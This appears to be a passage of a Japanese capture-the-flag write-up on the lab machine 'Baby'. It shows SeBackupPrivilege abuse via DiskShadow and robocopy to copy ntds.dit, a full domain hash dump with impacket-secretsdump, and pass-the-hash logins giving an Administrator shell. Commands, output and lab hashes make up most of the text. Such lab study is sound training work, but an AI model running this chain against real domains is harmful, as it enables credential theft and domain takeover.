+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Cleaning up...
+
+```
+
+いい感じでAdministratorのHash(`8d992faed38128ae85e95fa35868bb43`) が取得できました。
+このHashを利用して、Pass the Hashを試してみます。
+
+```bash
+┌──(kali㉿kali)-[~/htb/baby.htb]
+└─$ nxc winrm baby.vl -u 'Administrator' -p '' -H '8d992faed38128ae85e95fa35868bb43'
+WINRM       10.129.234.71   5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
+WINRM       10.129.234.71   5985   BABYDC           [-] baby.vl\Administrator: SpnegoError (16): Operation not supported or available, Context: Retrieving NTLM store without NTLM_USER_FILE set to a filepath
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.129.234.71   5985   BABYDC           [-] baby.vl\Administrator:8d992faed38128ae85e95fa35868bb43
+
+```
+
+うーん、Pass the Hashは失敗してしまいました。
+
+ここで、もう一度 `SeBackupPrivilege Privilege Escalation` と検索して、他の方法がないかを調査しました。
+
+以下の記事が見つかり、NTDS.ditファイルをコピーして、ローカルでHashを解析する方法が紹介されていました。
+[Windows Privilege Escalation: SeBackupPrivilege](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)
+
+[Understanding NTDS.DIT: Active Directory’s Critical Database](https://www.cayosoft.com/blog/ntds-dit/) によれば、NTDS.ditの概要は以下の通りです。
+
+> The ntds.dit file functions as the core database that powers Active Directory, containing essential data like user credentials, group policies, security settings, and domain configurations.
+
+[Windows Privilege Escalation: SeBackupPrivilege](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/) によれば、NTDS.ditは、ターゲットマシンが稼働中の場合は
+ファイルは使用中になるため、コピーすることができないようです。
+この制限を回避するために、 `DiskShadow` というWindowsの機能を利用して、NTDS.ditのスナップショットを作成し、そのスナップショットからNTDS.ditをコピーする方法が取られるようです。
+
+まず、`shadow.dsh` というファイルを作成して、以下の内容を記載します。また、最後に `unix2dos` コマンドを利用して、改行コードをDOS形式に変換しています。
+
+```bash
+┌──(kali㉿kali)-[~/htb/baby.htb]
+└─$ vim shadow.dsh 
+                                                                                           
+┌──(kali㉿kali)-[~/htb/baby.htb]
+└─$ cat shadow.dsh          
+set context persistent nowriters
+add volume c: alias cdrive
+create
+expose %cdrive% z:
+                                                                                           
+┌──(kali㉿kali)-[~/htb/baby.htb]
+└─$ unix2dos shadow.dsh 
+unix2dos: converting file shadow.dsh to DOS format...
+
+```
+
+この `shadow.dsh` をターゲットマシンにアップロードして、DiskShadowを実行します。
+
+```bash
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> diskshadow /s shadow.dsh
+Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation
+On computer:  BABYDC,  3/4/2026 10:38:34 AM
+
+-> set context persistent nowriters
+-> add volume c: alias cdrive
+-> create
+
+The .cab metadata file cannot be stored in the current working directory, because it is read-only.
+
+Use SET METADATA <metadata.cab> to specify an existing, writable directory.
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> 
+
+```
+
+`The .cab metadata file cannot be stored in the current working directory, because it is read-only.` とエラーが出てしまいました。
+`SET METADATA <metadata.cab>` を利用して、書き込み可能なディレクトリを指定する必要があるようです。
+
+`shadow.dsh` を以下の内容に変更して、再度アップロードします。
+
+```bash
+set context persistent nowriters
+set metadata C:\Windows\Temp\metadata.cab
+add volume c: alias cdrive
+create
+expose %cdrive% z:
+```
+
+アップロードし直して、再度DiskShadowを実行します。
+
+```bash
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> upload shadow.dsh
+                                        
+Info: Uploading /home/kali/htb/baby.htb/shadow.dsh to C:\Users\Caroline.Robinson\Documents\shadow.dsh                                                                                 
+                                        
+Data: 176 bytes of 176 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> diskshadow /s shadow.dsh
+Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation
+On computer:  BABYDC,  3/4/2026 10:41:47 AM
+
+-> set context persistent nowriters
+-> set metadata C:\Windows\Temp\metadata.cab
+-> add volume c: alias cdrive
+-> create
+Alias cdrive for shadow ID {b4f7e49f-80a5-45c2-947b-b38cfda9a73f} set as environment variable.
+Alias VSS_SHADOW_SET for shadow set ID {d3ce5024-effd-4ff0-9498-84012f7e25ac} set as environment variable.
+
+Querying all shadow copies with the shadow copy set ID {d3ce5024-effd-4ff0-9498-84012f7e25ac}
+
+        * Shadow copy ID = {b4f7e49f-80a5-45c2-947b-b38cfda9a73f}               %cdrive%
+                - Shadow copy set: {d3ce5024-effd-4ff0-9498-84012f7e25ac}       %VSS_SHADOW_SET%
+                - Original count of shadow copies = 1
+                - Original volume name: \\?\Volume{711fc68a-0000-0000-0000-100000000000}\ [C:\]
+                - Creation time: 3/4/2026 10:41:48 AM
+                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+                - Originating machine: BabyDC.baby.vl
+                - Service machine: BabyDC.baby.vl
+                - Not exposed
+                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
+                - Attributes:  No_Auto_Release Persistent No_Writers Differential
+
+Number of shadow copies listed: 1
+-> expose %cdrive% z:
+-> %cdrive% = {b4f7e49f-80a5-45c2-947b-b38cfda9a73f}
+The shadow copy was successfully exposed as z:\.
+->
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> 
+
+```
+
+無事にNTDS.ditのスナップショットが作成され、`z:\` ドライブにマウントされたようです。
+`z:\` ドライブに移動して、NTDS.ditをコピーします。
+
+```bash
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> robocopy /b z:\Windows\NTDS . ntds.dit
+
+-------------------------------------------------------------------------------
+   ROBOCOPY     ::     Robust File Copy for Windows
+-------------------------------------------------------------------------------
+
+  Started : Wednesday, March 4, 2026 10:43:33 AM
+   Source : z:\Windows\NTDS\
+     Dest : C:\Users\Caroline.Robinson\Documents\
+
+    Files : ntds.dit
+
+  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30
+
+------------------------------------------------------------------------------
+
+                           1    z:\Windows\NTDS\
+            New File              16.0 m        ntds.dit
+
+------------------------------------------------------------------------------
+
+               Total    Copied   Skipped  Mismatch    FAILED    Extras
+    Dirs :         1         0         1         0         0         0
+   Files :         1         1         0         0         0         0
+   Bytes :   16.00 m   16.00 m         0         0         0         0
+   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
+
+
+   Speed :           215,092,512 Bytes/sec.
+   Speed :            12,307.692 MegaBytes/min.
+   Ended : Wednesday, March 4, 2026 10:43:33 AM
+
+```
+
+ちゃんとコピーできました。
+あとは、このNTDS.ditをローカルにダウンロードして、先程ダウンロードした `system.hive` と組み合わせて、Hashを解析します。
+
+```bash
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> download ntds.dit
+                                                                                   
+Info: Downloading C:\Users\Caroline.Robinson\Documents\ntds.dit to ntds.dit        
+                                                                                   
+Info: Download successful!
+```
+
+では、 `impacket-secretsdump` を利用して、Hashを解析します。
+`-ntds` オプションでntds.ditファイルを指定し、`-system` オプションでsystem.hiveファイルを指定します。
+
+```bash
+┌──(kali㉿kali)-[~/htb/baby.htb]
+└─$ impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
+[*] Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:3d538eabff6633b62dbaa5fb5ade3b4d:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::
+baby.vl\Jacqueline.Barnett:1104:aad3b435b51404eeaad3b435b51404ee:20b8853f7aa61297bfbc5ed2ab34aed8:::
+baby.vl\Ashley.Webb:1105:aad3b435b51404eeaad3b435b51404ee:02e8841e1a2c6c0fa1f0becac4161f89:::
+baby.vl\Hugh.George:1106:aad3b435b51404eeaad3b435b51404ee:f0082574cc663783afdbc8f35b6da3a1:::
+baby.vl\Leonard.Dyer:1107:aad3b435b51404eeaad3b435b51404ee:b3b2f9c6640566d13bf25ac448f560d2:::
+baby.vl\Ian.Walker:1108:aad3b435b51404eeaad3b435b51404ee:0e440fd30bebc2c524eaaed6b17bcd5c:::
+baby.vl\Connor.Wilkinson:1110:aad3b435b51404eeaad3b435b51404ee:e125345993f6258861fb184f1a8522c9:::
+baby.vl\Joseph.Hughes:1112:aad3b435b51404eeaad3b435b51404ee:31f12d52063773769e2ea5723e78f17f:::
+baby.vl\Kerry.Wilson:1113:aad3b435b51404eeaad3b435b51404ee:181154d0dbea8cc061731803e601d1e4:::
+baby.vl\Teresa.Bell:1114:aad3b435b51404eeaad3b435b51404ee:7735283d187b758f45c0565e22dc20d8:::
+baby.vl\Caroline.Robinson:1115:aad3b435b51404eeaad3b435b51404ee:5fa67a134024d41bb4ff8bfd7da5e2b5:::
+[*] Kerberos keys from ntds.dit 
+Administrator:aes256-cts-hmac-sha1-96:ad08cbabedff5acb70049bef721524a23375708cadefcb788704ba00926944f4
+Administrator:aes128-cts-hmac-sha1-96:ac7aa518b36d5ea26de83c8d6aa6714d
+Administrator:des-cbc-md5:d38cb994ae806b97
+BABYDC$:aes256-cts-hmac-sha1-96:1a7d22edfaf3a8083f96a0270da971b4a42822181db117cf98c68c8f76bcf192
+BABYDC$:aes128-cts-hmac-sha1-96:406b057cd3a92a9cc719f23b0821a45b
+BABYDC$:des-cbc-md5:8fef68979223d645
+krbtgt:aes256-cts-hmac-sha1-96:9c578fe1635da9e96eb60ad29e4e4ad90fdd471ea4dff40c0c4fce290a313d97
+krbtgt:aes128-cts-hmac-sha1-96:1541c9f79887b4305064ddae9ba09e14
+krbtgt:des-cbc-md5:d57383f1b3130de5
+baby.vl\Jacqueline.Barnett:aes256-cts-hmac-sha1-96:851185add791f50bcdc027e0a0385eadaa68ac1ca127180a7183432f8260e084
+baby.vl\Jacqueline.Barnett:aes128-cts-hmac-sha1-96:3abb8a49cf283f5b443acb239fd6f032
+baby.vl\Jacqueline.Barnett:des-cbc-md5:01df1349548a206b
+baby.vl\Ashley.Webb:aes256-cts-hmac-sha1-96:fc119502b9384a8aa6aff3ad659aa63bab9ebb37b87564303035357d10fa1039
+baby.vl\Ashley.Webb:aes128-cts-hmac-sha1-96:81f5f99fd72fadd005a218b96bf17528
+baby.vl\Ashley.Webb:des-cbc-md5:9267976186c1320e
+baby.vl\Hugh.George:aes256-cts-hmac-sha1-96:0ea359386edf3512d71d3a3a2797a75db3168d8002a6929fd242eb7503f54258
+baby.vl\Hugh.George:aes128-cts-hmac-sha1-96:50b966bdf7c919bfe8e85324424833dc
+baby.vl\Hugh.George:des-cbc-md5:296bec86fd323b3e
+baby.vl\Leonard.Dyer:aes256-cts-hmac-sha1-96:6d8fd945f9514fe7a8bbb11da8129a6e031fb504aa82ba1e053b6f51b70fdddd
+baby.vl\Leonard.Dyer:aes128-cts-hmac-sha1-96:35fd9954c003efb73ded2fde9fc00d5a
+baby.vl\Leonard.Dyer:des-cbc-md5:022313dce9a252c7
+baby.vl\Ian.Walker:aes256-cts-hmac-sha1-96:54affe14ed4e79d9c2ba61713ef437c458f1f517794663543097ff1c2ae8a784
+baby.vl\Ian.Walker:aes128-cts-hmac-sha1-96:78dbf35d77f29de5b7505ee88aef23df
+baby.vl\Ian.Walker:des-cbc-md5:bcb094c2012f914c
+baby.vl\Connor.Wilkinson:aes256-cts-hmac-sha1-96:55b0af76098dfe3731550e04baf1f7cb5b6da00de24c3f0908f4b2a2ea44475e
+baby.vl\Connor.Wilkinson:aes128-cts-hmac-sha1-96:9d4af8203b2f9e3ecf64c1cbbcf8616b
+baby.vl\Connor.Wilkinson:des-cbc-md5:fda762e362ab7ad3
+baby.vl\Joseph.Hughes:aes256-cts-hmac-sha1-96:2e5f25b14f3439bfc901d37f6c9e4dba4b5aca8b7d944957651655477d440d41
+baby.vl\Joseph.Hughes:aes128-cts-hmac-sha1-96:39fa92e8012f1b3f7be63c7ca9fd6723
+baby.vl\Joseph.Hughes:des-cbc-md5:02f1cd9e52e0f245
+baby.vl\Kerry.Wilson:aes256-cts-hmac-sha1-96:db5f7da80e369ee269cd5b0dbaea74bf7f7c4dfb3673039e9e119bd5518ea0fb
+baby.vl\Kerry.Wilson:aes128-cts-hmac-sha1-96:aebbe6f21c76460feeebea188affbe01
+baby.vl\Kerry.Wilson:des-cbc-md5:1f191c8c49ce07fe
+baby.vl\Teresa.Bell:aes256-cts-hmac-sha1-96:8bb9cf1637d547b31993d9b0391aa9f771633c8f2ed8dd7a71f2ee5b5c58fc84
+baby.vl\Teresa.Bell:aes128-cts-hmac-sha1-96:99bf021e937e1291cc0b6e4d01d96c66
+baby.vl\Teresa.Bell:des-cbc-md5:4cbcdc3de6b50ee9
+baby.vl\Caroline.Robinson:aes256-cts-hmac-sha1-96:6fe5d46e01d6cf9909f479fb4d7afac0bd973981dd958e730a734aa82c9e13af
+baby.vl\Caroline.Robinson:aes128-cts-hmac-sha1-96:f34e6c0c8686a46eea8fd15a361601f9
+baby.vl\Caroline.Robinson:des-cbc-md5:fd40190d579138df
+[*] Cleaning up... 
+
+```
+
+ドメイン全体のHashが取得できました!!!
+
+`Administrator` ユーザーのHashは、`ee4457ae59f1e3fbd764e33d9cef123d` であることがわかります。
+
+もう一度Pass the Hashを試してみます。
+
+```bash
+┌──(kali㉿kali)-[~/htb/baby.htb]
+└─$ nxc winrm baby.vl -u Administrator -H ee4457ae59f1e3fbd764e33d9cef123d
+WINRM       10.129.234.71   5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.129.234.71   5985   BABYDC           [+] baby.vl\Administrator:ee4457ae59f1e3fbd764e33d9cef123d (Pwn3d!)
+
+```
+
+`(Pwn3d!)` と表示されている!!
+Evil-WinRMでシェルを取ってみます。
+
+```bash
+┌──(kali㉿kali)-[~/htb/baby.htb]
+└─$ evil-winrm -i baby.vl -u Administrator -H ee4457ae59f1e3fbd764e33d9cef123d
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                  
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                             
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+baby\administrator
+```
+
+できましたね。
+`root.txt` を取得して終わりです。
+
+```bash
+*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
+cdef629b79da3a9254fc8ab3c8423679
+```
+
+## まとめ
+
+Baby は Active Directory の基本的な攻撃手法を学べるマシンでした。
+
+攻略の流れを振り返ると、
+
+1. **LDAP匿名バインド** でユーザー一覧と初期パスワード (`BabyStart123!`) を取得
+2. **Password Spraying** で `Caroline.Robinson` が `STATUS_PASSWORD_MUST_CHANGE` 状態であることを発見
+3. `smbpasswd` でパスワードを変更し、**Evil-WinRM** でシェルを取得
+4. `Backup Operators` グループの **SeBackupPrivilege** を利用して、DiskShadow 経由で **NTDS.dit** をダンプ
+5. `impacket-secretsdump` でドメイン全体の Hash を抽出し、**Pass the Hash** で Administrator へ
+
+ポイントとしては、
+
+- LDAP の `description` 属性にパスワードが書いてあるのは現実の AD 環境でもよくある設定ミスらしいです。ldapsearch で `description` を確認する癖をつけておくと良さそうです
+- SAM からダンプした Hash（ローカルアカウント）と NTDS.dit からダンプした Hash（ドメインアカウント）は別物です。今回、SAM の Hash で Pass the Hash が失敗して NTDS.dit に切り替えたのはこの違いによるものでした
+- `SeBackupPrivilege` からの権限昇格は DiskShadow + robocopy のパターンを覚えておくと、今後も使えそうです
